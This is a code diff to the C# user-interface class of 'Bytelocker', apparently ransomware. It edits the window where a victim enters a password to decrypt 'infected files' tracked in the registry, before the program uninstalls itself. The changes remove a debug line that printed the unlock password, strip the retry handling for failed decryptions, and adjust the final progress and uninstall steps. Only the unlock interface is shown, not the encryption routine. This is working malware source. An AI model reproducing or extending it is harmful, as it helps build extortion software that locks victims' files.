@@ -20,8 +20,6 @@ namespace Bytelocker.UI
         private String current_decrypt_file_local = "null";
 
         public static String current_decrypt_file = "null";
-        public static bool error_decrypt_file = false;
-        public static bool error_decrypt_file_continue = false;
 
         private LinkLabel llAESInfo, llListOfInfectedFiles;
 
@@ -120,7 +118,6 @@ namespace Bytelocker.UI
             if (!(this.tbPassInput.Text == this.pm.returnPassword()))
             {
                 MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                Console.WriteLine(this.pm.returnPassword());
             }
             else
             {
@@ -138,7 +135,7 @@ namespace Bytelocker.UI
 
                 this.progress_bar_inc = this.pbDecryptProgress.Maximum / this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
 
-               this.tmTimerDecrypt.Start();
+                this.tmTimerDecrypt.Start();
 
                 new Thread(() =>
                 {
@@ -180,41 +177,6 @@ namespace Bytelocker.UI
 
         private void tmTimerDecrypt_Tick(object sender, EventArgs e)
         {
-            if (error_decrypt_file)
-            {
-                this.tmTimerDecrypt.Stop();
-
-                DialogResult messageBoxInput = MessageBox.Show("Failed to decrypt a previously encrypted file: \"" + MainWindow.current_decrypt_file + "\".\n\n" +
-                    "The file may be damaged/removed/locked or used by another process", "Error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
-
-                if (messageBoxInput == DialogResult.Retry)
-                {
-                    error_decrypt_file_continue = true;
-                    // add 2 second wait time after hitting retry
-                    this.tmTimerDecrypt.Interval = 2000;
-                } else
-                {
-                    error_decrypt_file_continue = true;
-                    error_decrypt_file = false;
-
-                    try
-                    {
-                        this.rm.DeleteValue(RegistryManager.FILES_KEY_NAME, current_decrypt_file);
-                    }
-                    catch (System.ArgumentException)
-                    {
-                        // if the value does not exist in registry
-                    }
-                }
-
-                this.tmTimerDecrypt.Start();
-
-                return;
-            }
-
-            // set interval to regular
-            this.tmTimerDecrypt.Interval = 100;
-
             if (!(this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
             {
                 if (!(this.current_decrypt_file_local == current_decrypt_file))
@@ -235,8 +197,9 @@ namespace Bytelocker.UI
             else
             {
                 this.tmTimerDecrypt.Stop();
-                this.Visible = false;
+                this.pbDecryptProgress.Value = this.pbDecryptProgress.Maximum;
                 MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                this.Visible = false;
                 Bytelocker.Uninstall();
             }
         }
